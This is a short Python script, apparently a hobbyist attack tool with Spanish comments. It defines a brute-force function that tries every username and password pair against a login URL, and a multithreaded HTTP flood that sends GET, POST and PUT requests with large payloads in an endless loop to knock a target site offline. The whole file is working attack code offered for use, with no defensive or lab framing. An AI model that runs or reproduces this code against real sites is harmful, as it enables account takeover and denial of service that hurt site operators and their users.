#ataques.py
import requests
import threading
import time

# Función para ataque de fuerza bruta
def ataque_fuerza_bruta(url, usuarios, passwords):
    # Asegurarse de que la URL tiene el esquema correcto
    if not url.startswith("http://") and not url.startswith("https://"):
        url = "https://" + url  # O "http://" si es necesario

    for usuario in usuarios:
        for password in passwords:
            datos = {"username": usuario, "password": password}
            try:
                respuesta = requests.post(url, data=datos)
                print(f"Intento: {usuario}/{password} -> {respuesta.status_code}")
            except requests.exceptions.RequestException as e:
                print(f"Error al realizar el ataque de fuerza bruta: {e}")

# Función para realizar ataques DDoS
def perform_attack(target_url):
    # Asegurarse de que la URL tiene el esquema correcto
    if not target_url.startswith("http://") and not target_url.startswith("https://"):
        target_url = "https://" + target_url

    headers = {
        "User-Agent": "Mozilla/5.0",
        "Accept": "*/*",
        "Connection": "keep-alive"
    }
    payload = {"key": "A" * 5000}
    while True:
        try:
            # GET request
            response_get = requests.get(target_url, headers=headers)
            print(f"GET {target_url}, estado: {response_get.status_code}")

            # POST request
            response_post = requests.post(target_url, headers=headers, data=payload)
            print(f"POST {target_url}, estado: {response_post.status_code}")

            # PUT request
            response_put = requests.put(target_url, headers=headers, data=payload)
            print(f"PUT {target_url}, estado: {response_put.status_code}")
        except requests.exceptions.RequestException as e:
            print(f"Error: {e}")
        time.sleep(0.01)

# Función para iniciar el ataque DDoS con múltiples hilos
def start_attack(target_url, num_threads):
    threads = []
    for _ in range(num_threads):
        thread = threading.Thread(target=perform_attack, args=(target_url,))
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()
